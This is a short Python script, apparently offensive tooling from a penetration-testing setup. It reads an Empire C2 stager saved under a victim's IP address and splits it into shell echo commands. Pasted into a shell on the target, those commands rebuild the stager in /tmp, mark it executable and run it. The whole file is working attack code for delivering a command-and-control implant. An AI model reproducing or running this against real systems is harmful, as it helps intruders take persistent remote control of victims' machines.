import os

def chunked_echo_script(file_content, remote_path="/tmp/empire.sh", chunk_size=200):
    """
    Given a string (file_content), returns a list of shell echo commands
    that reconstruct it line-by-line on the victim, chunking any long lines.
    Handles single quotes safely.
    """
    commands = [f"rm -f {remote_path}"]  # Clean up any old file first

    for line in file_content.splitlines():
        # Handle long lines by splitting into chunks
        while len(line) > 0:
            chunk = line[:chunk_size]
            safe_chunk = chunk.replace("'", "'\\''")
            commands.append(f"echo '{safe_chunk}' >> {remote_path}")
            line = line[chunk_size:]

    # Optional: Make it executable and run it
    commands.append(f"chmod +x {remote_path}")
    commands.append(f"{remote_path}")
    return commands

# Example usage:
# 1. Get stager string from EmpireDriver
stager_path = "/home/kali/dmpp/results/raw/empire/192_168_56_103.sh"
with open(stager_path, "r") as f:
    stager_code = f.read()

# 2. Generate the list of commands
commands = chunked_echo_script(stager_code, remote_path="/tmp/empire.sh", chunk_size=200)

# 3. Save to a shell script for manual pasting/uploading:
with open("upload_empire.sh", "w") as out:
    for cmd in commands:
        out.write(cmd + "\n")

print("Generated shell commands in upload_empire.sh. Paste them in your shell session.")
